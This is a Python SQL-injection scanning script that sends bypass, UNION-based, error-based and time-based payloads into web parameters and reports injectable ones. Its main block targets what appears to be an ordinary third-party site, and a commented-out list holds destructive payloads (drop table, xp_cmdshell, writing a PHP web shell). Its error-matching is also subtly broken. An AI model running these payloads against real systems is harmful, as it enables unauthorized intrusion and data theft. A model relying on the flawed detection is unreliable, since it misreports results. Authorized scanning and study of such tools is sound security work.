from enum import Enum
import re
import time
import requests
from bs4 import BeautifulSoup


def normalize_html(html: str) -> str:
    return re.sub(r'\d{4}-\d{2}-\d{2}\s+\d{2}:\d{2}:\d{2}', '[TIME]', html)


ERROR_KEYWORDS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_.*",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"PostgreSQL.*ERROR",
    r"Warning.*\Wpg_.*",
    r"valid PostgreSQL result",
    r"ORA-[0-9]{5}",
    r"Oracle error",
    r"Oracle.*Driver",
    r"SQLite/JDBCDriver",
    r"SQLite.Exception",
    r"System.Data.SQLite.SQLiteException",
    r"Warning.*sqlite_.*",
    r"valid SQLite",
    r"SQL Server.*Driver",
    r"Driver.*SQL Server",
    r"SQLServer JDBC Driver",
    r"com.microsoft.sqlserver",
    r"Unclosed quotation mark after the character string",
]

class HTTPError(Exception):
    pass


class HTTPStatus(Enum):
    OK = 200
    NotFound = 404
    InternalError = 500
    Forbidden = 403

class SQLTestStatus(Enum):
    OK = 0
    MayBugFound = 1
    BugFound = 2
    Error = 3


def _error_found(text: str) -> bool:
    tl = text.lower()
    return any(re.search(keyword, tl) for keyword in ERROR_KEYWORDS)


def _get_token_from_response(resp: requests.Response) -> str | None:
    soup = BeautifulSoup(resp.text, 'html.parser')
    token_input = soup.find("input", {"name": "csrf_token"})
    if token_input and token_input.get("value"):
        return token_input.get("value")
    return None


def _check_time_based_blind(url: str, param: str, payload: str, session: requests.Session, timeout: int = 5) -> bool:
    """
    Check time-based blind injection.
    Returns True if delay detected.
    """
    test_url = f"{url}?{param}={payload}"
    start = time.time()
    try:
        session.get(test_url, timeout=timeout + 2)
        elapsed = time.time() - start
    except requests.Timeout:
        return True
    return elapsed >= timeout


def _check_boolean_blind(url: str, param: str, session: requests.Session, is_numeric: bool = False) -> bool:
    """
    Check boolean blind injection.
    Returns True if boolean blind is possible.
    """
    if is_numeric:
        true_payload = f"1 AND 1=1"
        false_payload = f"1 AND 1=2"
    else:
        true_payload = f"'1' AND '1'='1"
        false_payload = f"'1' AND '1'='2"
    
    resp_true = session.get(f"{url}?{param}={true_payload}")
    resp_false = session.get(f"{url}?{param}={false_payload}")
    
    # Compare both length and content
    if len(resp_true.text) != len(resp_false.text):
        return True
    if normalize_html(resp_true.text) != normalize_html(resp_false.text):
        return True
    return False


# Safe payloads for initial testing
SAFE_PAYLOADS = [
    "' or '1'='1",
    "' or 1=1--",
    "' or 1=1#",
    "admin'--",
    "admin'#",
    "' or '1'='1'/*",
    
    "' union select null--",
    "' union select null,null--",
    "' union select version(),user()--",
    "' union select database(),user()--",
    
    "' and '1'='1",
    "' and '1'='2",
    
    # Time-based (safe, just sleep)
    "' and sleep(5)--",
    "' or pg_sleep(5)--",
    
    # Error-based
    "' and extractvalue(1,concat(0x7e,database()))--",
    "' and updatexml(1,concat(0x7e,database()),1)--",
    
    "' || '1'='1",
    "' or 1=1-- -",
    "'or 1=1--+",
    
    "' union select @@version--",
    "' union select user()--",
]

# DANGEROUS_PAYLOADS = [
#     "'; drop table users--",
#     "'; insert into admin values('hacker','pass')--",
#     "'; update users set password='123' where username='admin'--",
#     "'; exec xp_cmdshell('whoami')--",
#     "' into outfile '/var/www/html/shell.php'--",
# ]


def sql_test(url: str, params: list[str], method: str, *payloads) -> list[tuple[SQLTestStatus, dict[str, str | int]]]:
    """
    General SQL Injection Testing Function
    
    :param url: Target URL
    :param params: Parameter list
    :param method: Request method, 'GET' or 'POST'
    :param payloads: Payload list (uses SAFE_PAYLOADS if empty)
    :return: List of (SQLTestStatus, {parameter: value})
    """
    if not payloads:
        payloads = tuple(SAFE_PAYLOADS)
    
    if len(params) == 0:
        raise ValueError("No parameter provided.")
    if method not in ['GET', 'POST']:
        raise ValueError("Method must be 'GET' or 'POST'")

    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    session.get(url)  # Get cookie
    token = _get_token_from_response(session.get(url))
    
    rtn = []
    for param in params:
        current_token = token
        
        # Prepare base response for comparison
        try:
            if method == 'GET':
                base_url = f"{url}?{param}=1"
                base_response = session.get(base_url)
            else:
                base_data = {param: "1"}
                headers = {}
                if current_token:
                    headers["X-CSRF-Token"] = current_token
                base_response = session.post(url, data=base_data, headers=headers)
                next_token = _get_token_from_response(base_response)
                if next_token:
                    current_token = next_token
        except requests.exceptions.ConnectionError:
            raise HTTPError("Connection timeout")
        
        if base_response.status_code != HTTPStatus.OK.value:
            raise HTTPError(f"HTTP Error: {base_response.status_code}, reason: {base_response.reason}")
        
        # Independent blind injection checks (not tied to specific payloads)
        if _check_boolean_blind(url, param, session):
            rtn.append((SQLTestStatus.BugFound, {param: "BOOLEAN_BLIND_EXISTS"}))
        
        if _check_time_based_blind(url, param, "' AND SLEEP(5)--", session):
            rtn.append((SQLTestStatus.BugFound, {param: "TIME_BLIND_EXISTS"}))
        
        # Test each payload
        for payload in payloads:
            try:
                if method == 'GET':
                    test_url = f"{url}?{param}={payload}"
                    response = session.get(test_url)
                else:
                    test_data = {param: payload}
                    headers = {}
                    if current_token:
                        headers["X-CSRF-Token"] = current_token
                    response = session.post(url, data=test_data, headers=headers)
                    next_token = _get_token_from_response(response)
                    if next_token:
                        current_token = next_token
            except requests.exceptions.ConnectionError:
                raise HTTPError("Connection timeout")
            
            if response.status_code != HTTPStatus.OK.value:
                rtn.append((SQLTestStatus.Error, {param: payload, "errorcode": response.status_code}))
                continue
            
            # For time-based payloads, skip content comparison (already handled above)
            if "sleep" in payload.lower() or "pg_sleep" in payload.lower() or "benchmark" in payload.lower():
                continue
            
            if normalize_html(base_response.text) != normalize_html(response.text):
                if _error_found(response.text):
                    rtn.append((SQLTestStatus.BugFound, {param: payload}))
                else:
                    rtn.append((SQLTestStatus.MayBugFound, {param: payload}))
                continue
            
            rtn.append((SQLTestStatus.OK, {param: payload}))
    
    return rtn


def readable_sqltest_report(url: str, params: list[str], *payloads) -> str:
    """
    Generate a readable report of SQL injection testing result.

    Setup:
        >>> url = "http://testphp.vulnweb.com/artists.php"
        >>> params = ["artist"]
        >>> payloads = ["' or 1='1"]
    
    Example:
        >>> print(readable_sqltest_report(url, params, *payloads))
        ============= GET =============
        [-] Param "artist":
            Payload "' or 1='1" causes bug found.
                -> http://testphp.vulnweb.com/artists.php?artist=' or 1='1

        Param "artist":
            Safe: 0 - 0%
            MayBug: 0 - 0%
            Bug: 1 - 100%
            Error: 0 - 0%

        ============= POST =============
        [+] Param "artist":
            Payload "' or 1='1" is safe.
                -> POST to http://testphp.vulnweb.com/artists.php with data {'artist': '' or 1='1'}

        Param "artist":
            Safe: 1 - 100%
            MayBug: 0 - 0%
            Bug: 0 - 0%
            Error: 0 - 0%
    
    :param url: Target URL
    :param params: Parameter list
    :param payloads: Payload list
    :return: Readable report string, str
    """
    rtn = ""
    
    def _wrapper(func: callable, method: str) -> str:
        nonlocal rtn
        rtn = ""
        number_listing = {}
        
        try:
            results = func(url, params, method, *payloads)
        except Exception as e:
            rtn += f"[x] Error: {e}\n"
            return rtn

        for result in results:
            status, payload = result
            param = list(payload.keys())[0]
            plv = payload[param]
            
            if method == "GET":
                urlstr = f"\t-> {url}?{param}={plv}\n"
            else:
                urlstr = f"\t-> POST to {url} with data {{\"{param}\": \"{plv}\"}}\n"
            
            if param not in number_listing:
                number_listing[param] = {"safe": 0, "maybug": 0, "bug": 0, "error": 0}
            
            match status:
                case SQLTestStatus.OK:
                    rtn += f"[+] Param \"{param}\":\n    Payload \"{plv}\" is safe.\n{urlstr}"
                    number_listing[param]["safe"] += 1
                case SQLTestStatus.MayBugFound:
                    rtn += f"[?] Param \"{param}\":\n    Payload \"{plv}\" may cause bug found.\n{urlstr}"
                    number_listing[param]["maybug"] += 1
                case SQLTestStatus.BugFound:
                    rtn += f"[-] Param \"{param}\":\n    Payload \"{plv}\" causes bug found.\n{urlstr}"
                    number_listing[param]["bug"] += 1
                case SQLTestStatus.Error:
                    rtn += f"[x] Param \"{param}\":\n    Payload \"{plv}\" caused error.\n{urlstr}\t   Code {payload['errorcode']}\n"
                    number_listing[param]["error"] += 1
        
        for param, number in number_listing.items():
            all_tests = sum(number.values())
            if all_tests > 0:
                rtn += (f"\nParam \"{param}\":\n"
                        f"    Safe: {number['safe']} - {round(number['safe'] / all_tests * 100)}%\n"
                        f"    MayBug: {number['maybug']} - {round(number['maybug'] / all_tests * 100)}%\n"
                        f"    Bug: {number['bug']} - {round(number['bug'] / all_tests * 100)}%\n"
                        f"    Error: {number['error']} - {round(number['error'] / all_tests * 100)}%\n")
                rtn += "\n"
        return rtn
    
    rtn += "============= GET =============\n"
    rtn += _wrapper(sql_test, method="GET")
    rtn += "\n"
    rtn += "============= POST =============\n"
    rtn += _wrapper(sql_test, method="POST")
    return rtn


if __name__ == "__main__":
    # Quick test
    url = "http://www.fjyykj.com/Search.aspx"
    params = ["KeyWord"]
    payloads = SAFE_PAYLOADS
    print(readable_sqltest_report(url, params, *payloads))